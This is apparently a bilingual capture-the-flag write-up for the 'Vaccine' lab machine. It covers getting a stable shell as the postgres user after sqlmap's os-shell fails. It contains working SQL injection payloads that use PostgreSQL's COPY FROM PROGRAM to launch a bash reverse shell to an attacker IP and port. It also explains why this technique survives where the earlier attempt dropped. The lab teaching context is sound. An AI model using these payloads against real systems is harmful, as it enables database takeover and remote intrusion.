Vaccine

About: Vaccine is a very easy Linux machine that emphasizes enumeration and password cracking. Anonymous FTP access exposes a password-protected backup archive which can be cracked to recover web application credentials. These credentials grant access to a PHP application vulnerable to SQL injection which leads to command execution and an initial shell as the postgres user. Finally, privilege escalation can be achieved by abusing misconfigured sudo permissions on vi.

介绍：Vaccine 是一个非常简单的 Linux 机器，它侧重于枚举和密码破解。匿名 FTP 访问会暴露受密码保护的备份存档，破解该存档可以恢复 Web 应用程序凭据。这些凭证允许访问存在 SQL 注入漏洞的 PHP 应用程序，从而导致命令执行并以 postgres 用户身份获得初始 shell。最后，可以通过滥用 vi 中配置错误的 sudo 权限来实现权限提升。

Task 7

What program can the postgres user run as root using sudo?

postgres 用户可以使用 sudo 以 root 用户身份运行什么程序？

需要使用 sudo -l 命令进行查看。

由于 sqlmap –os-shell 底层是通过写 Web 目录的木马脚本执行命令，交互与回显不稳定，这里也确实执行不了 sudo -l。

所以我们反弹真实 shell 到攻击机上：

do you want to retrieve the command standard output? [Y/n/a] Y
[02:25:01] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[02:25:02] [WARNING] turning off pre-connect mechanism because of connection reset(s)
[02:25:02] [CRITICAL] connection reset to the target URL

是可以成功反弹 shell 的，但是秒断。这是因为反弹成功后，父进程直接结束，连带把 shell 也杀掉了。

另一种思路是建一张临时表，然后用 Postgres 的 copy ... from program 命令，使得数据库本身去执行 from program 后面的系统命令。

1
2

1';create table cmd_exec(cmd_output text);--+
1';copy cmd_exec from program '/bin/bash -c "bash -i >& /dev/tcp/10.10.16.102/1234 0>&1"'--+

第一条命令创建了一张 cmd_exec 表，其中只有一列 cmd_output，是文本类型。

第二条命令，让 Postgres 执行系统命令反弹 shell，把命令输出读取出来放到刚才的表中。

这样的好处是，postgres 数据库进程自己 fork 出来执行 bash ，父进程是后台一直运行的 postgres 服务，不是一次性 HTTP 请求，所以反弹连接不容易随请求销毁。
